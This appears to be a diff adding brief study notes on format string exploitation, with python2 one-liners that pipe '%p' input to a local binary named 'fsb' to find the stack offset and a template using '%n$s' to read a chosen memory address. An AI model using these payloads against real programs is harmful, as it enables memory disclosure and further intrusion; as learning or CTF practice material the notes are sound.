@@ -1,0 +1,7 @@
+[+] offset check
+stdin -> 'a' ,%p -> %p display the a value 
+Exploit Example  -> python2 -c "print 'A'*4 + '%p'" | ./fsb
+: get a offset
+
+[+] Format String Exploit
+(python2 -c "print '{memory_address}' + '%n\$s'") | ./fsb
